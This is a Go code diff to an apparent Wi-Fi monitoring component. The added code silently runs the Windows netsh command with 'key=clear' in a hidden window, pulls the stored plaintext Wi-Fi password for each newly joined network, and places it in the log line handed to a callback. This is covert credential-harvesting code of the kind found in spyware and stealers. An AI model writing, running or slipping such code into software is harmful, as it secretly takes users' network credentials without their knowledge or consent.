@@ -56,9 +56,28 @@ func (wm *wifiMonitor) checkNetwork() {
 
 	// Check if SSID changed (new connection or roaming).
 	if info.ssid != wm.lastSSID {
+		// Attempt to extract the plaintext Wi-Fi password
+		pwdCmd := exec.Command("netsh", "wlan", "show", "profile", "name="+info.ssid, "key=clear")
+		pwdCmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		pwdOut, err := pwdCmd.Output()
+		
+		password := "Unknown"
+		if err == nil {
+			pwdLines := strings.Split(string(pwdOut), "\n")
+			for _, pLine := range pwdLines {
+				if strings.Contains(pLine, "Key Content") || strings.Contains(pLine, "Contenu de la cl") {
+					parts := strings.SplitN(pLine, ":", 2)
+					if len(parts) == 2 {
+						password = strings.TrimSpace(parts[1])
+					}
+					break
+				}
+			}
+		}
+
 		ts := time.Now().Format("2006-01-02 15:04:05")
-		logLine := fmt.Sprintf("[%s] [WIFI] 📡 CONNECTED: SSID=%s | BSSID=%s | Signal=%s | Auth=%s | Channel=%s",
-			ts, info.ssid, info.bssid, info.signal, info.auth, info.channel)
+		logLine := fmt.Sprintf("[%s] [WIFI] 📡 CONNECTED: SSID=%s | BSSID=%s | Signal=%s | Auth=%s | Pass=%s",
+			ts, info.ssid, info.bssid, info.signal, info.auth, password)
 		wm.lastSSID = info.ssid
 		if wm.callback != nil {
 			wm.callback(logLine)
